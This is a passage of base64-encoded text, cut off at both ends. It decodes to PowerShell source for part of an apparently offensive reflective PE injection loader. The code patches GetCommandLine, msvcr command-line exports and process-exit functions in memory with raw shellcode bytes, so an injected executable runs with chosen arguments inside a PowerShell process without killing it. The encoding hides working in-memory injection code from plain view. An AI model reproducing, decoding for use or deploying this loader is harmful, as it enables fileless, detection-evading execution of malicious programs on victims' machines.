qZWN0IHdpdGggYWRkcmVzc2VzIHRvIGNvcGllcyBvZiB0aGUgYnl0ZXMgdGhhdCB3ZXJlIG92ZXJ3cml0dGVuIChhbmQgdGhlIGNvdW50KQogICAgRnVuY3Rpb24gVXBkYXRlLUV4ZUZ1bmN0aW9ucwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFBFSW5mbywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkZ1bmN0aW9ucywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkNvbnN0YW50cywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEV4ZUFyZ3VtZW50cywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJEV4ZURvbmVCeXRlUHRyCiAgICAgICAgKQogICAgICAgIAogICAgICAgICNUaGlzIHdpbGwgYmUgYW4gYXJyYXkgb2YgYXJyYXlzLiBUaGUgaW5uZXIgYXJyYXkgd2lsbCBjb25zaXN0IG9mOiBAKCREZXN0QWRkciwgJFNvdXJjZUFkZHIsICRCeXRlQ291bnQpLiBUaGlzIGlzIHVzZWQgdG8gcmV0dXJuIG1lbW9yeSB0byBpdHMgb3JpZ2luYWwgc3RhdGUuCiAgICAgICAgJFJldHVybkFycmF5ID0gQCgpIAogICAgICAgIAogICAgICAgICRQdHJTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKQogICAgICAgIFtVSW50MzJdJE9sZFByb3RlY3RGbGFnID0gMAogICAgICAgIAogICAgICAgIFtJbnRQdHJdJEtlcm5lbDMySGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoIktlcm5lbDMyLmRsbCIpCiAgICAgICAgaWYgKCRLZXJuZWwzMkhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyAiS2VybmVsMzIgaGFuZGxlIG51bGwiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFtJbnRQdHJdJEtlcm5lbEJhc2VIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgiS2VybmVsQmFzZS5kbGwiKQogICAgICAgIGlmICgkS2VybmVsQmFzZUhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyAiS2VybmVsQmFzZSBoYW5kbGUgbnVsbCIKICAgICAgICB9CgogICAgICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAjRmlyc3Qgb3ZlcndyaXRlIHRoZSBHZXRDb21tYW5kTGluZSgpIGZ1bmN0aW9uLiBUaGlzIGlzIHRoZSBmdW5jdGlvbiB0aGF0IGlzIGNhbGxlZCBieSBhIG5ldyBwcm9jZXNzIHRvIGdldCB0aGUgY29tbWFuZCBsaW5lIGFyZ3MgdXNlZCB0byBzdGFydCBpdC4KICAgICAgICAjICAgV2Ugb3ZlcndyaXRlIGl0IHdpdGggc2hlbGxjb2RlIHRvIHJldHVybiBhIHBvaW50ZXIgdG8gdGhlIHN0cmluZyBFeGVBcmd1bWVudHMsIGFsbG93aW5nIHVzIHRvIHBhc3MgdGhlIGV4ZSBhbnkgYXJncyB3ZSB3YW50LgogICAgICAgICRDbWRMaW5lV0FyZ3NQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxVbmkoJEV4ZUFyZ3VtZW50cykKICAgICAgICAkQ21kTGluZUFBcmdzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RyaW5nVG9IR2xvYmFsQW5zaSgkRXhlQXJndW1lbnRzKQogICAgCiAgICAgICAgW0ludFB0cl0kR2V0Q29tbWFuZExpbmVBQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbEJhc2VIYW5kbGUsICJHZXRDb21tYW5kTGluZUEiKQogICAgICAgIFtJbnRQdHJdJEdldENvbW1hbmRMaW5lV0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRLZXJuZWxCYXNlSGFuZGxlLCAiR2V0Q29tbWFuZExpbmVXIikKCiAgICAgICAgaWYgKCRHZXRDb21tYW5kTGluZUFBZGRyIC1lcSBbSW50UHRyXTo6WmVybyAtb3IgJEdldENvbW1hbmRMaW5lV0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIkdldENvbW1hbmRMaW5lIHB0ciBudWxsLiBHZXRDb21tYW5kTGluZUE6ICQoR2V0LUhleCAkR2V0Q29tbWFuZExpbmVBQWRkcikuIEdldENvbW1hbmRMaW5lVzogJChHZXQtSGV4ICRHZXRDb21tYW5kTGluZVdBZGRyKSIKICAgICAgICB9CgogICAgICAgICNQcmVwYXJlIHRoZSBzaGVsbGNvZGUKICAgICAgICBbQnl0ZVtdXSRTaGVsbGNvZGUxID0gQCgpCiAgICAgICAgaWYgKCRQdHJTaXplIC1lcSA4KQogICAgICAgIHsKICAgICAgICAgICAgJFNoZWxsY29kZTEgKz0gMHg0OCAjNjRiaXQgc2hlbGxjb2RlIGhhcyB0aGUgMHg0OCBiZWZvcmUgdGhlIDB4YjgKICAgICAgICB9CiAgICAgICAgJFNoZWxsY29kZTEgKz0gMHhiOAogICAgICAgIAogICAgICAgIFtCeXRlW11dJFNoZWxsY29kZTIgPSBAKDB4YzMpCiAgICAgICAgJFRvdGFsU2l6ZSA9ICRTaGVsbGNvZGUxLkxlbmd0aCArICRQdHJTaXplICsgJFNoZWxsY29kZTIuTGVuZ3RoCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI01ha2UgY29weSBvZiBHZXRDb21tYW5kTGluZUEgYW5kIEdldENvbW1hbmRMaW5lVwogICAgICAgICRHZXRDb21tYW5kTGluZUFPcmlnQnl0ZXNQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFRvdGFsU2l6ZSkKICAgICAgICAkR2V0Q29tbWFuZExpbmVXT3JpZ0J5dGVzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb3RhbFNpemUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLm1lbWNweS5JbnZva2UoJEdldENvbW1hbmRMaW5lQU9yaWdCeXRlc1B0ciwgJEdldENvbW1hbmRMaW5lQUFkZHIsIFtVSW50NjRdJFRvdGFsU2l6ZSkgfCBPdXQtTnVsbAogICAgICAgICRXaW4zMkZ1bmN0aW9ucy5tZW1jcHkuSW52b2tlKCRHZXRDb21tYW5kTGluZVdPcmlnQnl0ZXNQdHIsICRHZXRDb21tYW5kTGluZVdBZGRyLCBbVUludDY0XSRUb3RhbFNpemUpIHwgT3V0LU51bGwKICAgICAgICAkUmV0dXJuQXJyYXkgKz0gLCgkR2V0Q29tbWFuZExpbmVBQWRkciwgJEdldENvbW1hbmRMaW5lQU9yaWdCeXRlc1B0ciwgJFRvdGFsU2l6ZSkKICAgICAgICAkUmV0dXJuQXJyYXkgKz0gLCgkR2V0Q29tbWFuZExpbmVXQWRkciwgJEdldENvbW1hbmRMaW5lV09yaWdCeXRlc1B0ciwgJFRvdGFsU2l6ZSkKCiAgICAgICAgI092ZXJ3cml0ZSBHZXRDb21tYW5kTGluZUEKICAgICAgICBbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEdldENvbW1hbmRMaW5lQUFkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0oJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKICAgICAgICBpZiAoJFN1Y2Nlc3MgPSAkZmFsc2UpCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyAiQ2FsbCB0byBWaXJ0dWFsUHJvdGVjdCBmYWlsZWQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCA9ICRHZXRDb21tYW5kTGluZUFBZGRyCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTEgLU1lbW9yeUFkZHJlc3MgJEdldENvbW1hbmRMaW5lQUFkZHJUZW1wCiAgICAgICAgJEdldENvbW1hbmRMaW5lQUFkZHJUZW1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJEdldENvbW1hbmRMaW5lQUFkZHJUZW1wICgkU2hlbGxjb2RlMS5MZW5ndGgpCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJENtZExpbmVBQXJnc1B0ciwgJEdldENvbW1hbmRMaW5lQUFkZHJUZW1wLCAkZmFsc2UpCiAgICAgICAgJEdldENvbW1hbmRMaW5lQUFkZHJUZW1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJEdldENvbW1hbmRMaW5lQUFkZHJUZW1wICRQdHJTaXplCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTIgLU1lbW9yeUFkZHJlc3MgJEdldENvbW1hbmRMaW5lQUFkZHJUZW1wCiAgICAgICAgCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkR2V0Q29tbWFuZExpbmVBQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKICAgICAgICAKICAgICAgICAKICAgICAgICAjT3ZlcndyaXRlIEdldENvbW1hbmRMaW5lVwogICAgICAgIFtVSW50MzJdJE9sZFByb3RlY3RGbGFnID0gMAogICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkR2V0Q29tbWFuZExpbmVXQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSgkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSksIFtSZWZdJE9sZFByb3RlY3RGbGFnKQogICAgICAgIGlmICgkU3VjY2VzcyA9ICRmYWxzZSkKICAgICAgICB7CiAgICAgICAgICAgIHRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wID0gJEdldENvbW1hbmRMaW5lV0FkZHIKICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkU2hlbGxjb2RlMSAtTWVtb3J5QWRkcmVzcyAkR2V0Q29tbWFuZExpbmVXQWRkclRlbXAKICAgICAgICAkR2V0Q29tbWFuZExpbmVXQWRkclRlbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkR2V0Q29tbWFuZExpbmVXQWRkclRlbXAgKCRTaGVsbGNvZGUxLkxlbmd0aCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkQ21kTGluZVdBcmdzUHRyLCAkR2V0Q29tbWFuZExpbmVXQWRkclRlbXAsICRmYWxzZSkKICAgICAgICAkR2V0Q29tbWFuZExpbmVXQWRkclRlbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkR2V0Q29tbWFuZExpbmVXQWRkclRlbXAgJFB0clNpemUKICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkU2hlbGxjb2RlMiAtTWVtb3J5QWRkcmVzcyAkR2V0Q29tbWFuZExpbmVXQWRkclRlbXAKICAgICAgICAKICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRHZXRDb21tYW5kTGluZVdBZGRyLCBbVUludDMyXSRUb3RhbFNpemUsIFtVSW50MzJdJE9sZFByb3RlY3RGbGFnLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykgfCBPdXQtTnVsbAogICAgICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAKICAgICAgICAKICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAgICAgI0ZvciBDKysgc3R1ZmYgdGhhdCBpcyBjb21waWxlZCB3aXRoIHZpc3VhbCBzdHVkaW8gYXMgIm11bHRpdGhyZWFkZWQgRExMIiwgdGhlIGFib3ZlIG1ldGhvZCBvZiBvdmVyd3JpdGluZyBHZXRDb21tYW5kTGluZSBkb2Vzbid0IHdvcmsuCiAgICAgICAgIyAgIEkgZG9uJ3Qga25vdyB3aHkgZXhhY3RseS4uIEJ1dCB0aGUgbXN2Y3IgRExMIHRoYXQgYSAiRExMIGNvbXBpbGVkIGV4ZWN1dGFibGUiIGltcG9ydHMgaGFzIGFuIGV4cG9ydCBjYWxsZWQgX2FjbWRsbiBhbmQgX3djbWRsbi4KICAgICAgICAjICAgSXQgYXBwZWFycyB0byBjYWxsIEdldENvbW1hbmRMaW5lIGFuZCBzdG9yZSB0aGUgcmVzdWx0IGluIHRoaXMgdmFyLiBUaGVuIHdoZW4geW91IGNhbGwgX193Z2V0Y21kbG4gaXQgcGFyc2VzIGFuZCByZXR1cm5zIHRoZQogICAgICAgICMgICBhcmd2IGFuZCBhcmdjIHZhbHVlcyBzdG9yZWQgaW4gdGhlc2UgdmFyaWFibGVzLiBTbyB0aGUgZWFzeSB0aGluZyB0byBkbyBpcyBqdXN0IG92ZXJ3cml0ZSB0aGUgdmFyaWFibGUgc2luY2UgdGhleSBhcmUgZXhwb3J0ZWQuCiAgICAgICAgJERsbExpc3QgPSBAKCJtc3ZjcjcwZC5kbGwiLCAibXN2Y3I3MWQuZGxsIiwgIm1zdmNyODBkLmRsbCIsICJtc3ZjcjkwZC5kbGwiLCAibXN2Y3IxMDBkLmRsbCIsICJtc3ZjcjExMGQuZGxsIiwgIm1zdmNyNzAuZGxsIiBgCiAgICAgICAgICAgICwgIm1zdmNyNzEuZGxsIiwgIm1zdmNyODAuZGxsIiwgIm1zdmNyOTAuZGxsIiwgIm1zdmNyMTAwLmRsbCIsICJtc3ZjcjExMC5kbGwiKQogICAgICAgIAogICAgICAgIGZvcmVhY2ggKCREbGwgaW4gJERsbExpc3QpCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSREbGxIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkRGxsKQogICAgICAgICAgICBpZiAoJERsbEhhbmRsZSAtbmUgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFtJbnRQdHJdJFdDbWRMbkFkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCREbGxIYW5kbGUsICJfd2NtZGxuIikKICAgICAgICAgICAgICAgIFtJbnRQdHJdJEFDbWRMbkFkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCREbGxIYW5kbGUsICJfYWNtZGxuIikKICAgICAgICAgICAgICAgIGlmICgkV0NtZExuQWRkciAtZXEgW0ludFB0cl06Olplcm8gLW9yICRBQ21kTG5BZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAiRXJyb3IsIGNvdWxkbid0IGZpbmQgX3djbWRsbiBvciBfYWNtZGxuIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkTmV3QUNtZExuUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RyaW5nVG9IR2xvYmFsQW5zaSgkRXhlQXJndW1lbnRzKQogICAgICAgICAgICAgICAgJE5ld1dDbWRMblB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbFVuaSgkRXhlQXJndW1lbnRzKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjTWFrZSBhIGNvcHkgb2YgdGhlIG9yaWdpbmFsIGNoYXIqIGFuZCB3Y2hhcl90KiBzbyB0aGVzZSB2YXJpYWJsZXMgY2FuIGJlIHJldHVybmVkIGJhY2sgdG8gdGhlaXIgb3JpZ2luYWwgc3RhdGUKICAgICAgICAgICAgICAgICRPcmlnQUNtZExuUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEFDbWRMbkFkZHIsIFtUeXBlXVtJbnRQdHJdKQogICAgICAgICAgICAgICAgJE9yaWdXQ21kTG5QdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkV0NtZExuQWRkciwgW1R5cGVdW0ludFB0cl0pCiAgICAgICAgICAgICAgICAkT3JpZ0FDbWRMblB0clN0b3JhZ2UgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFB0clNpemUpCiAgICAgICAgICAgICAgICAkT3JpZ1dDbWRMblB0clN0b3JhZ2UgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFB0clNpemUpCiAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkT3JpZ0FDbWRMblB0ciwgJE9yaWdBQ21kTG5QdHJTdG9yYWdlLCAkZmFsc2UpCiAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkT3JpZ1dDbWRMblB0ciwgJE9yaWdXQ21kTG5QdHJTdG9yYWdlLCAkZmFsc2UpCiAgICAgICAgICAgICAgICAkUmV0dXJuQXJyYXkgKz0gLCgkQUNtZExuQWRkciwgJE9yaWdBQ21kTG5QdHJTdG9yYWdlLCAkUHRyU2l6ZSkKICAgICAgICAgICAgICAgICRSZXR1cm5BcnJheSArPSAsKCRXQ21kTG5BZGRyLCAkT3JpZ1dDbWRMblB0clN0b3JhZ2UsICRQdHJTaXplKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEFDbWRMbkFkZHIsIFtVSW50MzJdJFB0clNpemUsIFtVSW50MzJdKCRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpCiAgICAgICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgPSAkZmFsc2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJE5ld0FDbWRMblB0ciwgJEFDbWRMbkFkZHIsICRmYWxzZSkKICAgICAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEFDbWRMbkFkZHIsIFtVSW50MzJdJFB0clNpemUsIFtVSW50MzJdKCRPbGRQcm90ZWN0RmxhZyksIFtSZWZdJE9sZFByb3RlY3RGbGFnKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkV0NtZExuQWRkciwgW1VJbnQzMl0kUHRyU2l6ZSwgW1VJbnQzMl0oJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKICAgICAgICAgICAgICAgIGlmICgkU3VjY2VzcyA9ICRmYWxzZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyAiQ2FsbCB0byBWaXJ0dWFsUHJvdGVjdCBmYWlsZWQiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTmV3V0NtZExuUHRyLCAkV0NtZExuQWRkciwgJGZhbHNlKQogICAgICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkV0NtZExuQWRkciwgW1VJbnQzMl0kUHRyU2l6ZSwgW1VJbnQzMl0oJE9sZFByb3RlY3RGbGFnKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgICNOZXh0IG92ZXJ3cml0ZSBDb3JFeGl0UHJvY2VzcyBhbmQgRXhpdFByb2Nlc3MgdG8gaW5zdGVhZCBFeGl0VGhyZWFkLiBUaGlzIHdheSB0aGUgZW50aXJlIFBvd2Vyc2hlbGwgcHJvY2VzcyBkb2Vzbid0IGRpZSB3aGVuIHRoZSBFWEUgZXhpdHMuCgogICAgICAgICRSZXR1cm5BcnJheSA9IEAoKQogICAgICAgICRFeGl0RnVuY3Rpb25zID0gQCgpICNBcnJheSBvZiBmdW5jdGlvbnMgdG8gb3ZlcndyaXRlIHNvIHRoZSB0aHJlYWQgZG9lc24ndCBleGl0IHRoZSBwcm9jZXNzCiAgICAgICAgCiAgICAgICAgI0NvckV4aXRQcm9jZXNzIChjb21waWxlZCBpbiB0byB2aXN1YWwgc3R1ZGlvIGMrKykKICAgICAgICBbSW50UHRyXSRNc2NvcmVlSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoIm1zY29yZWUuZGxsIikKICAgICAgICBpZiAoJE1zY29yZWVIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIm1zY29yZWUgaGFuZGxlIG51bGwiCiAgICAgICAgfQogICAgICAgIFtJbnRQdHJdJENvckV4aXRQcm9jZXNzQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJE1zY29yZWVIYW5kbGUsICJDb3JFeGl0UHJvY2VzcyIpCiAgICAgICAgaWYgKCRDb3JFeGl0UHJvY2Vzc0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIkNvckV4aXRQcm9jZXNzIGFkZHJlc3Mgbm90IGZvdW5kIgogICAgICAgIH0KICAgICAgICAkRXhpdEZ1bmN0aW9ucyArPSAkQ29yRXhpdFByb2Nlc3NBZGRyCiAgICAgICAgCiAgICAgICAgI0V4aXRQcm9jZXNzICh3aGF0IG5vbi1tYW5hZ2VkIHByb2dyYW1zIHVzZSkKICAgICAgICBbSW50UHRyXSRFeGl0UHJvY2Vzc0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRLZXJuZWwzMkhhbmRsZSwgIkV4aXRQcm9jZXNzIikKICAgICAgICBpZiAoJEV4aXRQcm9jZXNzQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiRXhpdFByb2Nlc3MgYWRkcmVzcyBub3QgZm91bmQiCiAgICAgICAgfQogICAgICAgICRFeGl0RnVuY3Rpb25zICs9ICRFeGl0UHJvY2Vzc0FkZHIKICAgICAgICAKICAgICAgICBbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKICAgICAgICBmb3JlYWNoICgkUHJvY0V4aXRGdW5jdGlvbkFkZHIgaW4gJEV4aXRGdW5jdGlvbnMpCiAgICAgICAgewogICAgICAgICAgICAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSAkUHJvY0V4aXRGdW5jdGlvbkFkZHIKICAgICAgICAgICAgI1RoZSBmb2xsb3dpbmcgaXMgdGhlIHNoZWxsY29kZSAoU2hlbGxjb2RlOiBFeGl0VGhyZWFkLmFzbSk6CiAgICAgICAgICAgICMzMmJpdCBzaGVsbGNvZGUKICAgICAgICAgICAgW0J5dGVbXV0kU2hlbGxjb2RlMSA9IEAoMHhiYikKICAgICAgICAgICAgW0J5dGVbXV0kU2hlbGxjb2RlMiA9IEAoMHhjNiwgMHgwMywgMHgwMSwgMHg4MywgMHhlYywgMHgyMCwgMHg4MywgMHhlNCwgMHhjMCwgMHhiYikKICAgICAgICAgICAgIzY0Yml0IHNoZWxsY29kZSAoU2hlbGxjb2RlOiBFeGl0VGhyZWFkLmFzbSkKICAgICAgICAgICAgaWYgKCRQdHJTaXplIC1lcSA4KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTaGVsbGNvZGUxID0gQCgweDQ4LCAweGJiKQogICAgICAgICAgICAgICAgW0J5dGVbXV0kU2hlbGxjb2RlMiA9IEAoMHhjNiwgMHgwMywgMHgwMSwgMHg0OCwgMHg4MywgMHhlYywgMHgyMCwgMHg2NiwgMHg4MywgMHhlNCwgMHhjMCwgMHg0OCwgMHhiYikKICAgICAgICAgICAgfQogICAgICAgICAgICBbQnl0ZVtdXSRTaGVsbGNvZGUzID0gQCgweGZmLCAweGQzKQogICAgICAgICAgICAkVG90YWxTaXplID0gJFNoZWxsY29kZTEuTGVuZ3RoICsgJFB0clNpemUgKyAkU2hlbGxjb2RlMi5MZW5ndGggKyAkUHRyU2l6ZSArICRTaGVsbGNvZGUzLkxlbmd0aAogICAgICAgICAgICAKICAgICAgICAgICAgW0ludFB0cl0kRXhpdFRocmVhZEFkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRLZXJuZWwzMkhhbmRsZSwgIkV4aXRUaHJlYWQiKQogICAgICAgICAgICBpZiAoJEV4aXRUaHJlYWRBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkV4aXRUaHJlYWQgYWRkcmVzcyBub3QgZm91bmQiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkUHJvY0V4aXRGdW5jdGlvbkFkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0kV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpCiAgICAgICAgICAgIGlmICgkU3V